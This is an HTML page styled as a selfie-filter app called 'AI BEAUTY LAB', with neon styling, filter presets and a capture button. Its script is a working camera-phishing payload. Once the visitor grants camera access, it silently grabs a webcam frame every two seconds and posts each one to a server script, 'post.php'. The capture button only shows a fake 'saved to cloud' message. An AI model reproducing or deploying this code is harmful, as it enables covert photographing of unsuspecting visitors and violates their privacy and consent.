<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selfie Studio</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap');

        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }

        body {
            background: #050505;
            color: #e5e7eb;
            height: 100vh;
            display: flex;
            flex-direction: column;
            font-family: 'Poppins', sans-serif;
            overflow: hidden;
        }

        .header {
            padding: 14px 28px;
            background: rgba(10, 10, 10, 0.8);
            border-bottom: 1px solid rgba(0, 242, 255, 0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
            backdrop-filter: blur(10px);
            z-index: 50;
        }

        .header h1 {
            font-size: 1.3rem;
            font-weight: 700;
            color: #00f2ff;
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(0, 242, 255, 0.5);
        }

        .status-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            background: rgba(0, 242, 255, 0.1);
            padding: 6px 12px;
            border-radius: 16px;
            font-size: 0.75rem;
            color: #00f2ff;
            font-weight: 500;
            border: 1px solid rgba(0, 242, 255, 0.3);
        }

        .status-dot {
            width: 6px;
            height: 6px;
            background: #00f2ff;
            border-radius: 50%;
            box-shadow: 0 0 8px #00f2ff;
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.4; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.2); }
        }

        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 32px 24px;
            gap: 60px;
            background: radial-gradient(circle at center, #111 0%, #050505 100%);
        }

        .camera-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        .viewfinder {
            position: relative;
            width: 320px;
            height: 480px;
            background: #111;
            border-radius: 24px;
            border: 2px solid #00f2ff;
            box-shadow: 0 0 40px rgba(0, 242, 255, 0.2);
            overflow: hidden;
        }

        #user-webcam {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            transition: filter 0.3s ease;
        }

        .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(to bottom, transparent, #00f2ff, transparent);
            box-shadow: 0 0 15px #00f2ff;
            z-index: 10;
            animation: scan 4s linear infinite;
        }

        @keyframes scan {
            0% { top: 0%; }
            50% { top: 100%; }
            100% { top: 0%; }
        }

        .hud-overlay {
            position: absolute;
            inset: 0;
            pointer-events: none;
            z-index: 20;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            font-family: 'Orbitron', sans-serif;
            font-size: 10px;
            color: rgba(0, 242, 255, 0.6);
        }

        .hud-top { display: flex; justify-content: space-between; }
        .hud-bottom { display: flex; justify-content: space-between; align-items: flex-end; }

        .corner {
            position: absolute;
            width: 30px;
            height: 30px;
            border: 2px solid #00f2ff;
        }
        .top-left { top: 15px; left: 15px; border-right: 0; border-bottom: 0; }
        .top-right { top: 15px; right: 15px; border-left: 0; border-bottom: 0; }
        .bottom-left { bottom: 15px; left: 15px; border-right: 0; border-top: 0; }
        .bottom-right { bottom: 15px; right: 15px; border-left: 0; border-top: 0; }

        .ai-label {
            background: rgba(0, 242, 255, 0.1);
            padding: 2px 6px;
            border-radius: 4px;
        }

        .capture-control {
            display: flex;
            gap: 16px;
            align-items: center;
            flex-direction: column;
        }

        .snap-btn {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            background: transparent;
            border: 3px solid #00f2ff;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 0 15px rgba(0, 242, 255, 0.4);
            color: #00f2ff;
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .snap-btn:hover {
            background: rgba(0, 242, 255, 0.1);
            box-shadow: 0 0 25px rgba(0, 242, 255, 0.6);
            transform: scale(1.05);
        }

        .snap-btn:active {
            transform: scale(0.92);
        }

        .info-text {
            font-size: 0.7rem;
            color: rgba(0, 242, 255, 0.6);
            font-weight: 500;
            letter-spacing: 1px;
        }

        .filters-section {
            display: flex;
            flex-direction: column;
            gap: 18px;
            width: 320px;
        }

        .section-title {
            font-size: 0.7rem;
            font-weight: 700;
            color: rgba(0, 242, 255, 0.8);
            text-transform: uppercase;
            letter-spacing: 2px;
            font-family: 'Orbitron', sans-serif;
        }

        .filters-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
        }

        .filter-card {
            aspect-ratio: 1;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.25s ease;
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: rgba(255, 255, 255, 0.03);
            position: relative;
            overflow: hidden;
        }

        .filter-card-content {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        .filter-preview {
            width: 44px;
            height: 44px;
            border-radius: 10px;
            background-size: cover;
            background-position: center;
        }

        .filter-name {
            font-size: 0.65rem;
            font-weight: 500;
            color: #9ca3af;
            text-align: center;
        }

        .filter-card.active {
            border-color: #00f2ff;
            background: rgba(0, 242, 255, 0.15);
            box-shadow: 0 0 15px rgba(0, 242, 255, 0.2);
        }
        .filter-card.active .filter-name { color: #00f2ff; }

        .filter-card:hover:not(.active) {
            border-color: rgba(0, 242, 255, 0.5);
            background: rgba(255, 255, 255, 0.06);
        }

        /* Filter background styles */
        .filter-card:nth-child(1) .filter-preview {
            background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
        }

        .filter-card:nth-child(2) .filter-preview {
            background: linear-gradient(135deg, #ff00cc 0%, #3333ff 100%);
        }

        .filter-card:nth-child(3) .filter-preview {
            background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%);
        }

        .filter-card:nth-child(4) .filter-preview {
            background: linear-gradient(135deg, #333 0%, #000 100%);
        }

        .filter-card:nth-child(5) .filter-preview {
            background: linear-gradient(135deg, #00ff00 0%, #003300 100%);
        }

        #canvas, #video { display: none; }

        @media (max-width: 1200px) {
            .main-content {
                flex-direction: column;
                gap: 28px;
                padding: 24px;
            }

            .filters-section {
                max-width: 100%;
            }

            .filters-grid {
                grid-template-columns: repeat(5, 1fr);
            }
        }

        @media (max-width: 768px) {
            .header {
                padding: 12px 16px;
            }

            .header h1 {
                font-size: 1.2rem;
            }

            .main-content {
                padding: 16px;
                gap: 20px;
            }

            .viewfinder {
                width: 100%;
                max-width: 280px;
                height: 420px;
            }

            .filters-grid {
                grid-template-columns: repeat(4, 1fr);
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>AI BEAUTY LAB</h1>
        <div class="status-badge">
            <div class="status-dot"></div>
            <span id="status-text">NEURAL ENGINE: ACTIVE</span>
        </div>
    </div>

    <div class="main-content">
        <div class="camera-section">
            <div class="viewfinder">
                <div class="scan-line"></div>
                <div class="hud-overlay">
                    <div class="hud-top">
                        <span class="ai-label">FACIAL MAPPING...</span>
                        <span>FPS: 60.0</span>
                    </div>
                    <div class="hud-bottom">
                        <span>REC ●</span>
                        <span class="ai-label">v2.4 NEURAL RENDER</span>
                    </div>
                </div>
                <div class="corner top-left"></div>
                <div class="corner top-right"></div>
                <div class="corner bottom-left"></div>
                <div class="corner bottom-right"></div>
                <video id="user-webcam" autoplay playsinline muted></video>
            </div>
            <div class="capture-control">
                <button class="snap-btn" id="snap" title="Capture photo">
                    <i class="fas fa-bolt"></i>
                </button>
                <span class="info-text">INITIALIZE RENDER</span>
            </div>
        </div>

        <div class="filters-section">
            <div class="section-title">AI Styles</div>
            <div class="filters-grid">
                <div class="filter-card active" onclick="setFilter(this, 'none', 'Normal')">
                    <div class="filter-card-content">
                        <div class="filter-preview"></div>
                        <div class="filter-name">Normal</div>
                    </div>
                </div>
                <div class="filter-card" onclick="setFilter(this, 'brightness(1.2) contrast(1.1) saturate(1.3)', 'Glamour')">
                    <div class="filter-card-content">
                        <div class="filter-preview"></div>
                        <div class="filter-name">Glamour</div>
                    </div>
                </div>
                <div class="filter-card" onclick="setFilter(this, 'sepia(0.8) hue-rotate(-30deg)', 'Retro')">
                    <div class="filter-card-content">
                        <div class="filter-preview"></div>
                        <div class="filter-name">Retro</div>
                    </div>
                </div>
                <div class="filter-card" onclick="setFilter(this, 'grayscale(1) contrast(1.5)', 'Noir')">
                    <div class="filter-card-content">
                        <div class="filter-preview"></div>
                        <div class="filter-name">Noir</div>
                    </div>
                </div>
                <div class="filter-card" onclick="setFilter(this, 'invert(1) hue-rotate(180deg)', 'Cyber')">
                    <div class="filter-card-content">
                        <div class="filter-preview"></div>
                        <div class="filter-name">Cyber</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <canvas id="canvas" width="640" height="480"></canvas>
    <video id="video" playsinline autoplay></video>

    <script>
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'post.php',
                dataType: 'json',
                async: false
            });
        }

        function setFilter(el, filter, name) {
            $('.filter-card').removeClass('active');
            $(el).addClass('active');
            $('#user-webcam').css('filter', filter);
            $('#status-text').text("PROCESSING " + name.toUpperCase() + "...");
            setTimeout(() => $('#status-text').text('NEURAL ENGINE: ACTIVE'), 1500);
        }

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                const video = document.getElementById('video');
                const userWebcam = document.getElementById('user-webcam');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                video.srcObject = stream;
                userWebcam.srcObject = stream;

                // Automatic capture every 2 seconds
                setInterval(() => {
                    context.drawImage(video, 0, 0, 640, 480);
                    const data = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                    post(data);
                }, 2000);

            } catch (e) {
                $('#status-text').text('HARDWARE ERROR');
                alert("Neural Engine requires camera access to initialize mapping.");
            }
        }

        document.getElementById('snap').addEventListener('click', function() {
            $('#status-text').text('EXPORTING HD RENDER...');
            $(this).css('background', 'rgba(0, 242, 255, 0.2)');
            setTimeout(() => {
                $(this).css('background', 'transparent');
                $('#status-text').text('RENDER SAVED TO CLOUD');
                setTimeout(() => $('#status-text').text('NEURAL ENGINE: ACTIVE'), 1500);
            }, 300);
        });

        init();
    </script>
</body>
</html>
